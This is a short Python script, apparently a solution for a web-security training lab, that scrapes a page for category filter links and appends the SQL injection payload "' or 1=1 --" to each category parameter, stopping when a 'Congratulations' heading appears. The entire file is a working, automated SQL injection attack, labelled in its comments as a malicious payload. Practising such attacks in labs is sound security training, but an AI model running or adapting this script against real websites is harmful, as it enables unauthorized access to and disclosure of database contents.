import requests
import sys
import time
from bs4 import BeautifulSoup

url = sys.argv[1]
print(url)

# Make initial request to the URL
response = requests.get(url)
soup = BeautifulSoup(response.text, 'html.parser')

# Find all filter category links
filter_links = soup.find_all('a', class_='filter-category')
print(filter_links)

# Iterate over each link
for link in filter_links:
    href = link.get('href')
    if href and 'category=' in href:
        # Create malicious payload and make request
        payload = "' or 1=1 --"
        final_url = f"{url}{href}{payload}"
        res = requests.get(final_url)
        print(res.text)  
        time.sleep(1)  # Wait for 1 second
        
        # Get the updated content
        soup = BeautifulSoup(res.text, 'html.parser')
        completed = soup.find('h4')

        if completed and "Congratulations" in completed.text:
            print(completed.text)
            break
